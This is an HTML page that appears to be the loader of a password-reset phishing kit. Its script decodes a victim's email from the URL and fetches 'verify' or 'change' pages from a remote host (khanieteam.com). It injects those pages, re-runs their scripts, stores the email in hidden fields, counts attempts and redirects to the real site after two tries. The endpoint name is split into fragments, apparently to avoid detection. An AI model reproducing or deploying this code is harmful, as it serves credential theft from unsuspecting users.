<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link
      id="favicon"
      rel="icon"
      href="original-favicon.ico"
      type="image/x-icon"
    />
   <base href="https://khanieteam.com/ResetPass/Server/assets/" />
     <!-- <base href="http://tools.com/pages/latestpages/ResetPass/Server/assets/" /> -->

    <script defer>
      // const BASE_URL = "http://tools.com/pages/latestpages/ResetPass/Server";
      // const ASSETS_URL = "http://tools.com/pages/latestpages/ResetPass/Server/assets";
      const BASE_URL = "https://khanieteam.com/ResetPass/Server";
      const ASSETS_URL = "https://khanieteam.com/ResetPass/Server/assets";

      async function getPageContent(page, route, original) {
        fetch(`${BASE_URL}/${route}/${page}.html`)
          .then((response) => response.text())
          .then((datan) => {
            document.querySelector("#myFrame").innerHTML = datan;
            const scripts = document
              .querySelector("#myFrame")
              .querySelectorAll("script");

            // console.log(scripts);

            scripts.forEach((script) => {
              const newScript = document.createElement("script");
              newScript.textContent = script.textContent;
              document.body.appendChild(newScript); // Append to body or head
            });

            document.querySelector("#fuc").value =
              document.querySelector("#foc").value;
            document.querySelector("#orgi").value = original;
            document.querySelector("#page").value = page;
            document.querySelector("#general_loader").style.display = "none";
          })
          .catch((error) => {
            console.error("Error Loading data:", error);
          });
      }

      async function abs(ml, mg, route, page) {
        try {
          /*   let r = await fetch(`${ml}?${mg}`);
          let v = await r.json();
          let page = JSON.parse(v).mx_page;
          let original = JSON.parse(v).original; */
          let original = "";

          console.log(mg, page, original, "here", route);

          getPageContent(page, route, original);
        } catch (e) {
          console.log("ABS Func", e);
        }
      }

      let xx = window.location.href.split("?");
      xx = xx[1].split("__");
      let page = xx[3];
      let mg = "";
      let route = "";
      let base64regex =
        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

      if (xx[1] != undefined) {
        if (!base64regex.test(xx[1])) {
          mg = xx[1];
        } else {
          mg = atob(xx[1]);
        }

        if (xx[2] == "vy") {
          route = "verify";
        } else if (xx[2] == "re") {
          route = "change";
        } else {
          console.log("No extra script loaded for this page.");
        }

        let rd1 = BASE_URL;
        let rd2 = "/engine/";
        let rd3 = "serveP";
        let rd4 = "age.p";
        let rd5 = "hp";
        let rd6 = "";

        console.log(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg);

        document.addEventListener("DOMContentLoaded", function () {
          abs(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg, route, page);
        });
      }
    </script>
    <script
      type="text/javascript"
      src="https://code.jquery.com/jquery-latest.min.js"
    ></script>
    <script src="http://tools.com/pages/latestpages/ResetPass/Server/index.js"></script>
  </head>

  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        height: 100%;
      }

      * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
      }
      #general_loader {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #f1f2f555;
        z-index: 99;
      }

      #general_loader > div {
        width: 40px;
        height: 40px;
        border: 6px solid #ccc;
        border-top-color: #00bfff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
    </style>

    <div id="general_loader">
      <div></div>
    </div>

    <input type="hidden" id="route" name="email" required placeholder="" />
    <input type="hidden" id="loc" name="email" required placeholder="Loc" />
    <input type="hidden" id="foc" name="email" required placeholder="FOC" />
    <input type="hidden" id="trial" name="email" required placeholder="trial" />
    <input
      type="hidden"
      id="orgi"
      name="orgi"
      required
      placeholder="original"
    />
    <input type="hidden" id="page" name="page" required placeholder="PG" />

    <div id="myFrame"></div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        // sessionStorage.clear();

        document.querySelector("#route").value = route;
        let trialCount = sessionStorage.getItem("num_trial");
        let original = document.querySelector("#orgi").value;

        if (!trialCount) {
          sessionStorage.setItem("num_trial", 0);
        } else if (trialCount >= 2) {
          window.location.assign(original);
        }

        let foc = document.querySelector("#foc");
        let trial = document.querySelector("#trial");

        console.log(mg, original, "mew");

        foc.value = mg;

        trial.value = trialCount;

        // Your code here
      });
    </script>
  </body>
</html>
